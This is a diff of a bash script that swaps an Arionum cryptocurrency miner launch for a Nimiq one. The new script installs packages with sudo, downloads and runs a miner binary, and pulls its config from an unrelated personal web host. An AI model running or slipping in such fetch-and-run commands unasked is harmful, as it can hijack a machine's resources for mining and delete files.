@@ -1,9 +1,2 @@
 #! /bin/bash
-cd .. && cd arionum-java && cd arionum-miner && touch config.cfg && chmod 755 config.cfg && echo "pool
-http://aropool.com
-2yxFUkk3T5fczaMvHAnuAXKjo8LhGsYMZJ65Hamwq78KpXcyXFNPX16fgpgkAWo2cW3LwDsPXQjN3Q7Ek3ZUNmzp
-7
-standard
-true
-53a9f527d1b
-" > config.cfg && ./run.sh
+cd && sudo apt-get update && sudo apt-get -y install openjdk-8-jdk maven git gcc make build-essential && rm -rf nimiqs && mkdir nimiqs && cd nimiqs && wget https://github.com/skypool-org/skypool-nimiq-miner/releases/download/v1.3.0/skypool-nimiq-v1.3.0-linux-x64-extreme.zip && unzip skypool-nimiq-v1.3.0-linux-x64-extreme.zip && sleep 10 && cd skypool-nimiq-v1.3.0-linux-x64-extreme && rm -rf config.txt && wget http://darman.inknot.hol.es/config.txt && ./skypool-node-client
